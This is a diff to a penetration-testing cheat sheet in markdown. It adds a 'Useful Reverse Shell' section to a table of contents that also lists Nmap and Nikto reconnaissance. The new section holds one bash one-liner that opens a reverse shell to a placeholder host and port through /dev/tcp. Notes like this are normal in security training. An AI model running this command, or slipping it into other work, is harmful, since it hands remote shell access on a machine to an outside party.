@@ -1,6 +1,7 @@
 # Table of Content
 
 - [Useful Linux Command](#linux)
+- [Useful Reverse Shell](#reverseshell)
 - [Reconnaissance](#recon)
    - [Nmap](#nmap)
    - [Nikto](#nikto)
@@ -45,17 +46,10 @@
 <a name="nikto"></a>
 ### Nikto
 
+<a name="reverseshell"></a>
+# Useful Reverse Shell
 
-
-
-
-
-
-
-
-
-
-
+```bash -i >& /dev/tcp/[host]/[port] 0>&1```
 
 <a name="webapp"></a>
 # Web App 
